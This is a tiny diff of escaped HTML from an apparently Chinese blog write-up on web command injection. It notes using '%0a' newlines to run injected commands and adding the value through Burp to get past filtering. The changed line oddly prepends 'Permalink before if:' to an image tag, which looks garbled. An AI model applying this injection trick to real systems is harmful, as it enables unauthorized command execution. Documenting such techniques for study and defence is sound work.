@@ -1217,7 +984,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008206.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
